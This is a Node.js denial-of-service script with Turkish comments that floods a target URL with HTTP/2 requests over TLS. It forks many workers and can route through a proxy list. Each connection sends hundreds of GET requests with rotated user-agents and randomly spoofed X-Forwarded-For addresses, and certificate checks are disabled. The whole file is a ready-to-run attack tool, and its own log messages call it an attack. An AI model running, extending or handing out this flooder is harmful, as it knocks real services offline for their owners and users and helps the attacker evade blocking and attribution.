// tls-proxy.js – HTTP/2 TLS Flood (Proxy destekli)
// Kullanım: node tls-proxy.js <url> <süre> <thread>
// Örnek: node tls-proxy.js https://example.com 60 1250

process.on('uncaughtException', function(er) {});
process.on('unhandledRejection', function(er) {});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');
const path = require("path");
const cluster = require('cluster');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');

if (process.argv.length < 4) {
    console.log('Kullanım: node tls-proxy.js <url> <süre> <thread>');
    console.log('Örnek: node tls-proxy.js https://example.com 60 1250');
    process.exit(0);
}

const target_url = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const threads = parseInt(process.argv[4]) || 10;
const target = target_url.split('"')[0];
const parsed = url.parse(target);
const rate = 500; // Her thread'in göndereceği istek sayısı (arttırılabilir)

let proxies = [];
if (fs.existsSync('proxy.txt')) {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n').filter(p => p.trim());
} else {
    console.log('[!] proxy.txt bulunamadı, proxysiz devam...');
}

// User-Agent listesi (kısa, istersen uzat)
const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
];

function spoof() {
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

const cplist = [
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA"
];

function startflood() {
    const useProxy = proxies.length > 0;

    function doRequest() {
        let cipper = cplist[Math.floor(Math.random() * cplist.length)];
        let socket = null;

        if (useProxy) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
            const req = http.request({
                host: proxy[0],
                port: proxy[1],
                ciphers: cipper,
                method: 'CONNECT',
                path: parsed.host + ":443"
            });
            req.on('connect', (res, sock) => {
                socket = sock;
                createConnection(socket);
            });
            req.on('error', () => setTimeout(doRequest, 100));
            req.end();
        } else {
            createConnection(null);
        }

        function createConnection(socket) {
            const tlsOptions = {
                host: parsed.host,
                ciphers: cipper,
                secureProtocol: 'TLS_method',
                servername: parsed.host,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2']
            };
            if (socket) tlsOptions.socket = socket;

            const tlsConn = tls.connect(tlsOptions, () => {
                const client = http2.connect(parsed.href, {
                    createConnection: () => tlsConn,
                    settings: { enablePush: false, initialWindowSize: 65535 }
                });
                client.on('error', () => {});
                for (let i = 0; i < rate; i++) {
                    const headers = {
                        ':method': 'GET',
                        ':path': parsed.path || '/',
                        'user-agent': UAs[Math.floor(Math.random() * UAs.length)],
                        'x-forwarded-for': spoof(),
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'cache-control': 'no-cache'
                    };
                    const req = client.request(headers);
                    req.on('error', () => {});
                    req.on('response', () => req.close());
                    req.end();
                }
                setTimeout(() => client.close(), 1000);
            });
            tlsConn.on('error', () => setTimeout(doRequest, 100));
        }
    }

    // Thread'leri başlat
    for (let t = 0; t < threads; t++) {
        (function loop() {
            doRequest();
            setTimeout(loop, 200 + Math.random() * 300);
        })();
    }
}

// Cluster master/worker
if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`[+] Thread ${i+1} başlatıldı.`);
    }
    console.log(`[+] Saldırı ${duration} saniye devam edecek.`);
    setTimeout(() => {
        console.log('[+] Saldırı sonlandı.');
        process.exit(1);
    }, duration * 1000);
} else {
    startflood();
}